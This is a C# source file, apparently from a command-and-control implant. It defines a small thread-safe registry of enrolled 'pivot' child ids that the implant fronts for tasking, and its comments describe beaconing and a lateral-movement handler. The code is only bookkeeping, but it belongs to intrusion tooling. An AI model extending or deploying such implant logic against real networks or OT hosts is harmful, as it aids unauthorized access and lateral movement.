using System.Collections.Concurrent;

namespace Rod.Implant.Internal;

// The fronting half's implant-side ledger (architecture.md Sec 5.2, the Pivot
// class): the pivot children this implant enrolled, whose tasking this
// implant's beacon stream claims and executes on their behalf. A pivot child
// is an identity with no process -- network gear, an OT host -- so the only
// record that it is frontable from here is the enrollment this implant itself
// performed. The registry is the fronting gate: tasking that arrives marked
// for an implant this one did not enroll is refused on the task, exactly like
// a signature failure, because nothing here vouches for the target.

/// <summary>
/// The set of Pivot-class child ids this implant derived and now fronts.
/// Thread-safe: the beacon loop reads it per fronted task, and a lateral.move
/// handler running on another task's thread records into it.
/// </summary>
internal sealed class FrontedPivots
{
    // The child ids this implant enrolled (case-sensitive: implant ids are
    // guid strings the server generated and echoed back verbatim).
    private readonly ConcurrentDictionary<string, byte> _children = new();

    /// <summary>Records a child this implant enrolled as frontable.</summary>
    public void Record(string childId) => _children[childId] = 1;

    /// <summary>Whether this implant enrolled the child and may front its tasking.</summary>
    public bool Knows(string childId) => _children.ContainsKey(childId);
}
